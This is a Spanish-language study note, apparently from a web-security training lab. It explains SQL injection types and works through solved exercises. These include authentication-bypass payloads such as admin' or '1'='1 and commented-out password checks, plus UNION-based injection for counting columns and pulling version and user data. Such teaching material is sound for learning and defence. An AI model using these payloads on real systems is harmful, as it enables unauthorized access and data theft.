25-11-2024 18:54
Status: #idea
Tags: 

# SQL Injections

- [[#SQL Injection (SQLi)|SQL Injection (SQLi)]]
- [[#Syntax Errors|Syntax Errors]]
- [[#Tipos de SQL Injections|Tipos de SQL Injections]]
- [[#Authentication Bypass|Authentication Bypass]]
	- [[#Authentication Bypass#Operador OR|Operador OR]]
	- [[#Authentication Bypass#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Usando comentarios|Usando comentarios]]
		- [[#Usando comentarios#Otro ejemplo|Otro ejemplo]]
		- [[#Usando comentarios#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Union Clause|Union Clause]]
		- [[#Union Clause#Columnas pares|Columnas pares]]
		- [[#Union Clause#Columnas impares|Columnas impares]]
		- [[#Union Clause#Ejercicio Resuelto|Ejercicio Resuelto]]
	- [[#Authentication Bypass#Union Injection|Union Injection]]
		- [[#Union Injection#Descubrir el número de columnas|Descubrir el número de columnas]]
			- [[#Descubrir el número de columnas#Order By|Order By]]
			- [[#Descubrir el número de columnas#Union|Union]]
	- [[#Authentication Bypass#Location of Injection|Location of Injection]]
		- [[#Location of Injection#Ejercicio Resuelto|Ejercicio Resuelto]]



La mayoría de aplicaciones tienen una base de datos para guardar información de lo que sucede en la aplicación. Para conseguir que la web sea dinámica, se necesita interactuar en tiempo real con la base de datos.

El flujo de funcionamiento es el siguiente:

1- El usuario hace una petición.
2- Llega a la aplicación.
3- Se traslada al back-end de la aplicación.
4- Desde el back-end de la aplicación, se contacta con la base de datos y se recupera lo solicitado.

![[Pasted image 20241125185612.png]]

## SQL Injection (SQLi)

Hay muchos tipos de inyecciones que se pueden realizar en web apps, tales como HTTP Injection, code injection y command injection, pero el más común de todos, son sin duda los SQL Injections.

Su funcionamiento es sencillo, el usuario malintencionado hará un uso de un campo input, para modificar la query final que se envía a la base de datos, devolviendo así información que el usuario no debería de ver, o obteniendo control sobre la base de datos.

Hay muchas maneras de conseguir esto, pero lo más normal es que el atacante inyecte código SQL en un input que no tiene validaciones correctas. El caso más básico de inyecciones SQL, sería usar apóstrofes (') o ("), para romper el string del back-end, y así poder inyectar la query maliciosa.

Una vez el atacante comprueba que puede hacer inyecciones SQL, tendrá que ejecutar otras queries para obtener información, o para alterar el funcionamiento de la base de datos. Normalmente, se utilizan [stacked queries](https://www.sqlinjection.net/stacked-queries/) o también con [unions](https://www.mysqltutorial.org/sql-union-mysql.aspx/).

El impacto de una inyección SQL puede ser devastador, sobre todo si los permisos en el back-end y la base de datos son muy laxos. 

- Para empezar, podríamos recuperar los datos que queríamos, obteniendo así acceso a información "protegida". Además, este tipo de vulnerabilidad puede provocar un breach de datos y contraseñas.
- Otro caso de uso sería poder acceder a cuentas de usuario sin necesitar las credenciales, ya que vulneraríamos la comprobación de contraseña con una inyección. Esto nos daría acceso a paneles de administración. Por otro lado, los atacantes también podrían leer y escribir en ficheros del back-end, lo que puede permitir la creación de back doors en nuestra aplicación, consiguiendo así control total de nuestra web.

Para prevenir este tipo de vulnerabilidad, deberemos asegurarnos de que el código de nuestra web es fuerte y seguro, además de tener permisos especificados en nuestra base de datos y tener un back-end que haga comprobaciones antes de llamar a la base de datos.

## Syntax Errors

```php
Error: near line 1: near "'": syntax error
```

Es común encontrarnos con errores de sintaxis cuando estamos haciendo payloads y probándolas. Normalmente este problema se debe a que no estamos cerrando bien los apóstrofes o hemos escrito algo mal.


## Tipos de SQL Injections

Se caracterizan por cuando y como conseguimos acceder a los datos.

![[Pasted image 20241126183711.png]]

En casos sencillos, el output será mostrado por pantalla en el front-end, pudiendo así leerlo directamente. Esto se conoce como In-band, y tiene dos tipos: **Union Based**, y **Error Based**.

Con el **Union Based** podremos especificar la localización específica para que la query vuelque los datos ahí. Mientras que la **Error Based**, se identifica cuando podemos los errores de PHP o SQL en el front-end, lo que nos permitirá crear un error SQL que nos devuelva el resultado de nuestra query.

En casos más complicados, no veremos el output en el front-end, por lo que tendremos que utilizar lógica SQL para conseguir ver el output caracter a caracter. Esto se conoce como **Blind SQL Injection**, y tiene dos tipos: **Boolean Based** y **Time Based**.

Con el tipo **Boolean Based** podremos usar statements para controlar si una página nos devuelve algo de output, por ejemplo 'original query response', si nuestra condición es true. Mientras que las inyecciones **Time Based**, podremos usar queries de SQL para por ejemplo, introducir una pequeña delay con la sentencia Sleep().

Y finalmente, en algunos casos no tendremos acceso directo al output, por lo que tendremos que dirigir el output a una localización remota, como un registro DNS, esperando recuperar el output desde ahí. Esto se conoce como inyección **Out-of-band**.

## Authentication Bypass

En el siguiente panel de administración podremos ver el funcionamiento de una inyección SQL para burlar la seguridad de este.

![[Pasted image 20241126185850.png]]

Si nos logeamos con el usuario admin y la contraseña p@ssw0rd, funcionará y podremos logearnos como admin. Pero, ¿podríamos acceder al panel sin saber la contraseña?

![[Pasted image 20241126185917.png]]

La query que se está ejecutando es la siguiente:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

Vemos como la página está recuperando los parámetros que enviamos, tanto el username como el password y usándolos directamente en la query.

Esto es una luz verde para las SQL injection, ya que este es el tipo de código que nos permitirá vulnerar la seguridad.

Para confirmar que este panel es vulnerable, tendremos que añadir algunas de estas payloads, siendo la primera columna el caracter a usar, y la segunda su traducción en la URL (URL encoding):

`'`: `%27`
`"`: `%22`
`#`:`%23`
`;`:`%3B`
`)`:`%29`

Tendremos que usar el URL encoding en caso de que queramos/tengamos que probar a hacer la payload en peticiones GET, por ejemplo, si no tuviésemos el input para probar directamente.

En este caso vemos que si añadimos un apóstrofe sencillo, cambia el funcionamiento y salta un error.

![[Pasted image 20241126191744.png]]

Y nos da un error de sintaxis, que se debe a que no están bien cerrados los apóstrofes. Y aquí es donde entra en juego el operador OR.

### Operador OR

Una payload que serviría en este caso sería la siguiente:

```sql
admin' or '1'='1
```

Donde ponemos una condición que siempre será true (1=1) y otra que sabemos que es true en este caso, que sería el username igual a admin, quedando nuestra query así:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

Por lo tanto el resumen sería:

- Si el nombre de usuario es admin
	OR
- Si 1=1 devuelve true (que siempre es true)
	AND
- Si la contraseña es 'something'

Aquí tenemos un diagrama que lo explica:

![[Pasted image 20241126192024.png]]
Esto nos terminará devolviendo true, y permitiéndonos entrar en el panel de administración.

> [!NOTA]
> La query que hemos usado arriba es una de las muchas que podremos ver en  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
> 

### Ejercicio Resuelto

Se nos presenta este panel de administración, que como podemos intuir, es vulnerable a inyecciones SQL. Para afirmar esto, probaremos a introducir caracteres como ' o ", y comprobar si nos devuelve algún mensaje de error.

![[Captura de pantalla 2024-11-26 a las 19.31.11.png]]

Efectivamente, si introducimos tom' veremos como nos salta un syntax error.

![[Captura de pantalla 2024-11-26 a las 19.32.38.png]]

A partir de aquí tendremos que probar payloads y ver como va reaccionando la query mostrada por pantalla.

Quedando el payload final así: 

```
tom' OR '1'='1
```


### Usando comentarios

En esta sección vamos a ver como usar comentarios para ayudarnos a crear payloads más complejas.

Como cualquier otro lenguaje, SQL nos permite hacer comentarios. Los comentarios son útiles por si queremos dejar una parte de una query comentada, y que así no se ejecute, o también para explicar que hace una query.

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

También podremos usar el símbolo `#`:

```shell-session
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

¿Y como podremos usar esto para hacer un authentication bypass?

Pues dejando nuestra query de la siguiente manera:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Consiguiendo así que todo lo que venga después de admin no se ejecute, y esto nos permitiría logearnos de manera instantánea.

#### Otro ejemplo

![[Pasted image 20241126194104.png]]

SQL permite el uso de paréntesis para permitir que se haga check de condiciones antes que otras.

En este ejemplo en concreto, vemos que se asegura de que el id siempre sea mayor que 1, también vemos que la contraseña está hasheada, lo que no nos permitirá usar este campo para intentar la inyección.

Si intentamos entrar con credenciales válidas de admin no nos dejará, ya que el id es 1:

![[Pasted image 20241126194252.png]]

Si intentamos entrar con el usuario de tom, veremos que si que nos deja, ya que la id es mayor que 1:

![[Pasted image 20241126194337.png]]

Y como podríamos hacer para entrar como admin? Pues haciendo una inyección con comentarios y cerrando el paréntesis antes del AND:

```
admin')--
```

Dejándonos entrar en el panel correctamente:

![[Pasted image 20241126194436.png]]

#### Ejercicio Resuelto

Se nos presenta con este panel de administración que ejecuta la query y se nos pide que entremos con el usuario con id 5:

![[Captura de pantalla 2024-11-26 a las 20.13.21.png]]

```
SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```

Podríamos ignorar la instrucción del id 5 y entrar con el usuario tom, pero este no tiene el id 5.

Por lo tanto tendremos que encontrar la manera de cerrar la variable username y hacerle ver a la query que somos el usuario con id 5.

Esto lo podemos conseguir con la payload: 

```
' OR id = 5) -- '
```

Dejando la query final así:

```
SELECT * FROM logins WHERE (username='' OR id = 5) -- '' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```


### Union Clause

Esta sentencia de SQL se usa para combinar los resultados de múltiples SELECT. Esto quiere decir que con una inyección UNION podremos leer datos de las tablas que queramos dentro del DMBS, incluso de otras bases de datos. Vamos a ver un ejemplo en una base de datos de muestra:

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

Usando el UNION en las tablas tendremos este resultado, ya que se han combinado los resultados y se han volcado los datos de la tabla ships en la tabla ports.

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

> [!IMPORTANTE]
> El tipo de datos tiene que ser exactamente igual al hacer el UNION, si no fallará.

#### Columnas pares

Para que el UNION funcione, necesitaremos que se usen el mismo número de columnas en ambas tablas. Por ejemplo, si intentamos hacer un UNION cuando hay diferente número de columnas, obtendremos este mensaje:

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Una vez que tengamos el mismo número de columnas, podremos ejecutar el UNION sin problema alguna, por ejemplo:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Este UNION nos devolverá el username y el password de la tabla passwords volcado en la tabla products, asumiendo que la tabla de products tenga 2 columnas.

#### Columnas impares

En la mayoría de los casos no vamos a tener tanta suerte y que las columnas de una tabla sean el mismo número que las de la otra tabla. Pero hay maneras de solucionar esto. La más común es meter "basura" en nuestra query SQL. Podríamos hacer queries como las siguientes:

```sql
SELECT "junk" from passwords
```

```sql
SELECT 1 from passwords
```

Esto nos devolverá "junk" y 1 respectivamente.

> [!info] IMPORTANTE
> Cuando rellenemos con datos basura, tenemos que asegurarnos que los tipos de datos son iguales, si no la query no funcionará. Por simplicidad, usaremos números, ya que también nos ayudarán a llevar cuenta de las posiciones en nuestra payload.

> [!tip] TIP
> Para inyecciones SQL avanzadas, podríamos usar 'NULL' para rellenar columnas, ya que se adapta a todo tipo de datos.

Conociendo esto, nos quedarán queries como esta:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Si tuviésemos más columnas, tendríamos que modificar el UNION y añadir más números:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

Esto devolverá algo así:

```shell
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

#### Ejercicio Resuelto

El enunciado nos dice lo siguiente: 

Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

Una vez conectados vemos que tenemos dos tablas, una llamada employees y otra departments, como estamos conectados directamente a la base de datos podremos usar estos comandos:

```sql
DESCRIBE employees;
```

```sql
DESCRIBE departments;
```

Esto nos permitirá ver que columnas tiene employees y cuales tiene departments, y posteriormente podremos preparar nuestra query para hacer el union.

Employees en este caso tiene 6 columnas, y departments 2, por lo tanto la query quedaría así:

```sql
SELECT * FROM employees UNION SELECT dept_no, dept_name, 1,2,3,4 FROM departments
```

### Union Injection

Ahora que sabemos que son las cláusulas UNION podremos empezar a entender que son este tipo de inyecciones.

Se nos presenta esta web, y si probamos una payload sencilla como un apóstrofe tendremos un syntax error.

![[Pasted image 20241127190532.png]]

Esto nos indica que posiblemente sea vulnerable a inyecciones SQL.

#### Descubrir el número de columnas

Para descubrir el número de columnas que hay, podremos comenzar usando un ORDER BY. Con esto incrementaremos el número de columnas, hasta que nos devuelva un error. Al darnos este error, sabremos el número de columnas que tiene la tabla.

##### Order By

Es seguro que hay al menos una columna en la tabla, por lo tanto podríamos empezar con el siguiente payload:

```sql
' order by 1-- -
```

Ahora tendremos que ir incrementándola de 1 en uno, por ejemplo, order by 2, order by 3, etc. Si nos da un error en order by 4, pues nos estará diciendo que la tabla tiene 3 columnas.

##### Union

Esto se puede hacer también con el UNION, incrementado el número de columnas que le pasamos, por ejemplo:

```sql
cn' UNION select 1,2,3,4-- -
```

Seguiríamos haciendo sucesivamente: 1,2,3,4,5 hasta que funcione bien, ya que con el UNION el error que nos da es inverso al ORDER BY, ya que nos indica que que el SELECT tiene un distinto número de columnas.

Esto es lo que veríamos si tenemos que seguir añadiendo columnas:

![[Pasted image 20241127191254.png]]

Y esto si ha salido bien:

![[Pasted image 20241127191320.png]]

Una vez sepamos cuantas columnas tiene nuestro objetivo, podremos pasar al siguiente paso y comenzar a formar payloads.

### Location of Injection

La ubicación de la inyección va a depender de lo que se nos esté mostrando, ya que como vemos en la imagen de abajo, con nuestra payload UNION habíamos puesto 1,2,3,4 y solo se muestran 2,3,4. Esto es común, ya que hay campos que no interesa mostrar al usuario, como por ejemplo, el id.

Por lo tanto, no deberíamos poner nuestra inyección al principio, ya que si no, no se vería.

![[Pasted image 20241127191320.png]]

Este es uno de los beneficios que nos aporta usar números como data basura, ya que nos permitirá ver directamente las posiciones.

Para probar que podemos obtener datos de la base de datos, probaremos directamente la query @@version.

```sql
cn' UNION select 1,@@version,3,4-- -
```

Con lo que obtendremos esto:

![[Pasted image 20241127191742.png]]

#### Ejercicio Resuelto

Se nos presenta este panel:
![[Captura de pantalla 2024-11-27 a las 19.21.05.png]]

Mi primer instinto es probar a poner cualquier cosa en el search box, y veremos como está filtrando, presuntamente de una base de datos.

Para probar si es vulnerable, podremos usar un apóstrofe y veremos que saltan errores sintácticos:

![[Captura de pantalla 2024-11-27 a las 19.22.10.png]]

Automáticamente, voy a buscar el número de columnas que hay disponibles, usando quieres como el union select, por lo que he llegado a usar esta payload:

```sql
a' UNION select 1,2,3 -- -
```

Como vemos, nos da error de número de columnas:

![[Captura de pantalla 2024-11-27 a las 19.24.52.png]]

Si subimos a 4, funcionará, por lo que veremos esto:

![[Captura de pantalla 2024-11-27 a las 19.25.36.png]]

A partir de aquí, podremos substituir el número 2,3,4 por lo que querremos ejecutar, en este caso la función user(), quedando la query así:

```sql
a' UNION select 1,user(),3,4 -- -
```

Mostrándonos así el usuario activo en bbdd:

![[Captura de pantalla 2024-11-27 a las 19.26.39.png]]

---
# {{References}}